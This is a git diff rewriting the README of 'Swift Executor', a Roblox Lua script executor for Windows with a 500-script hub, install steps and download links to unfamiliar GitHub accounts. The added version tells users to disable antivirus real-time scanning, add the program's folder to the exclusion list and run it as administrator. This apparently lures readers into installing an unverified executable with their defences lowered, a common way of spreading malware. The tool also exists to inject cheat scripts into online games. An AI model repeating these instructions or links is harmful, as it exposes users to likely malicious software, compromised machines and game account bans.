@@ -1,131 +1,68 @@
-# Swift Executor PC v3.8 - Roblox Script Executor 2026
+# 🚀 swift-executor-lua-hub - Run Roblox scripts on your computer
 
-> Swift Executor is a Windows desktop Roblox script executor for 2026, built around Lua script execution, a 500+ script hub, a lightweight desktop UI, and practical support for Windows 10/11.
+[![](https://img.shields.io/badge/Download-Swift_Executor-blue.svg)](https://github.com/scentless-dialogue204/swift-executor-lua-hub)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/reedtylermz6657/swift-executor-lua-hub?style=flat-square)](https://github.com)
+This application provides a simple way to manage and run scripts for Roblox. It includes a library of over 500 pre-made scripts. The design focuses on speed and ease of use. You can launch scripts with a few clicks. This tool works on Windows 10 and Windows 11. It requires a 64-bit system.
 
----
+## 🛠 Prerequisites
 
-<p align="center">
-  <a href="https://reedtylermz6657.github.io/swift-executor-lua-hub/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Swift%20Executor-v3.8%20Latest-brightgreen?style=for-the-badge" alt="Download Swift Executor">
-  </a>
-</p>
+Before you start, ensure your computer meets these needs:
 
-> **[Direct Download - Swift Executor v3.8](https://reedtylermz6657.github.io/swift-executor-lua-hub/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+*   Windows 10 or 11 (64-bit version).
+*   Active internet connection for script updates.
+*   Administrative rights on your computer account.
+*   Roblox installed and updated to the latest version.
 
----
+You should turn off real-time scanning in your antivirus software temporarily. Some security programs flag script executors as threats because they interact with other programs. This is a common situation for these types of tools. Add the folder where you save the program to your antivirus exclusion list to prevent issues.
 
-[Download Latest Build](https://reedtylermz6657.github.io/swift-executor-lua-hub/)
+## 📥 How to Download and Install
 
----
+Follow these steps to set up the software.
 
-## Overview
+1. Visit the [official releases page](https://github.com/scentless-dialogue204/swift-executor-lua-hub) to download the installer.
+2. Choose the latest version from the list.
+3. Save the file to your desktop or a folder you can find easily.
+4. Open the downloaded file to start the installation.
+5. Follow the prompts on the screen to finish the setup.
+6. A shortcut will appear on your desktop once the process ends. 
 
-Swift Executor is a Windows-focused Roblox script executor for users who want a compact desktop application for running Lua scripts inside Roblox. It combines script execution, an integrated script hub, and an auto-update engine so the app can stay closer to newer builds with less manual work.
+## ⚙️ Running the Program
 
-The project is aimed at everyday use on Windows 10 and Windows 11. It emphasizes local script handling, batch execution, and a multi-language interface. SQLite-backed storage is included to help keep queued scripts and application state organized within the desktop environment.
+Once you have installed the software, follow these steps to use it:
 
-## Features at a Glance
+1. Launch Roblox and join a game.
+2. Open the Swift Executor program using the desktop shortcut.
+3. The interface will appear. Click the "Attach" button at the bottom of the window to connect the executor to your game.
+4. You will see a list of available scripts in the sidebar. Use the search bar to find a specific script by name.
+5. Select a script from the list. The code will load into the main editor window.
+6. Press the "Execute" button to run the script. 
+7. The changes will take effect in your game immediately.
 
-- One-click Lua injection flow for quicker script launching
-- Built-in script hub with 500+ scripts gathered in one place
-- Persistent script queue for saved execution sessions
-- Auto-update engine designed to help keep the desktop app current
-- Multi-language UI for wider regional usability
-- Batch execution mode for running several scripts in sequence
-- Built-in debugger for inspection and troubleshooting tasks
-- SQLite-based local storage for structured app data and queues
+## 📋 Features
 
-## Supported Games & Scripts
+The executor offers several tools to manage your scripts:
 
-| Roblox Game / Use Case | Script Category |
-| --- | --- |
-| Brookhaven RP | Utility scripts |
-| Blox Fruits | Combat and automation scripts |
-| Adopt Me! | Convenience scripts |
-| Doors | Helper and timing scripts |
-| Arsenal | Gameplay scripts |
-| Universal Roblox use | Lua executor scripts |
-| Script hub browsing | Searchable script collections |
+*   **Script Hub:** Access more than 500 scripts categorized by function.
+*   **Editor:** Write your own Lua code or edit existing scripts.
+*   **Auto-Attach:** The software detects when Roblox opens and prepares for use.
+*   **Lightweight UI:** The interface uses minimal memory so it does not slow down your game performance.
+*   **Favorites:** Mark your most-used scripts to keep them at the top of your list.
+*   **Theme Control:** Change the look of the window to match your preference.
 
-## System Requirements
+## 💡 Troubleshooting
 
-| Component | Minimum |
-| --- | --- |
-| Operating System | Windows 10 or Windows 11 |
-| RAM | 4 GB |
-| Storage | 500 MB free space |
-| .NET | .NET Desktop Runtime compatible with the app build |
-| Roblox | Installed Roblox client for script execution workflows |
+If the program does not work, try these steps:
 
-## Getting Started
+*   **Check Updates:** Verify that you have the most recent version of the executor. Older versions often stop working when Roblox pushes an update.
+*   **Re-attach:** Click the "Detach" button, wait five seconds, and click "Attach" again to refresh the connection.
+*   **Permissions:** Run the program as an administrator. Right-click the shortcut and select "Run as administrator."
+*   **Clear Cache:** Delete the contents of the local cache folder if the list of scripts fails to load.
+*   **Reinstall:** If errors persist, delete the application and run the installer again from the main download link.
 
-Clone the repository and launch the desktop app from the build folder:
+## 🛡 Security and Safety
 
-`git clone https://github.com/reedtylermz6657/swift-executor-lua-hub.git
+Always use scripts from sources you trust. Running unknown code can lead to account bans or computer issues. Only use scripts provided within the verified hub. Do not share your login information with any program, including this one. The executor does not ask for your password. If a box pops up asking for your password, close the program immediately. 
 
-`cd swift-executor-update-v3.8`
+This tool serves as a utility for local script execution. Use it responsibly and respect the rules of the games you play. Exploiting or modifying games can lead to account restrictions.
 
-`Swift ExecutorExecutor.exe`
-
-If your build output uses a different folder name, update the path to match your local project layout.
-
-## Script Hub - Popular Searches 2026
-
-- roblox script executor windows 11
-- lua injection desktop app
-- roblox script hub 500+ scripts
-- auto-update roblox executor
-- sqlite script queue desktop app
-- batch execution lua executor
-- multi-language roblox script tool
-
-## Architecture Overview
-
-swift-executor-update-v3.8/  
-├── Swift ExecutorExecutor.exe  
-├── script-hub/  
-├── queue/  
-├── updates/  
-├── debugger/  
-├── locale/  
-└── data.sqlite  
-
-## FAQ
-
-**Is Swift Executor limited to Windows?**  
-Yes. The product profile identifies Windows as the supported platform.
-
-**Will it still function after Roblox updates?**  
-The auto-update engine is meant to help the app stay aligned with newer versions, but compatibility still depends on the current Roblox client and the build you are using.
-
-**What sets it apart from a basic script loader?**  
-Swift Executor includes a script hub, batch execution, debugging tools, and local persistence, so it offers more than a minimal launcher.
-
-**Can this affect my account?**  
-Use is subject to Roblox terms and your own responsibility. No account outcome can be guaranteed by the project.
-
-**Does it save data locally?**  
-Yes. The profile includes SQLite-based storage, which is used for local data such as queues and app records.
-
-## Roadmap - 2026
-
-- [ ] Expand script hub organization and search flows
-- [ ] Improve debugger visibility for script sessions
-- [ ] Refine update handling for newer Windows builds
-- [ ] Add more localization options in the desktop UI
-- [ ] Improve queue management and session persistence
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
-<p align="center">
-  <i>Swift Executor v3.8 for Windows Roblox script workflows in 2026.</i>
-</p>
+Keywords: roblox, lua, script, executor, windows, gaming, software, utility
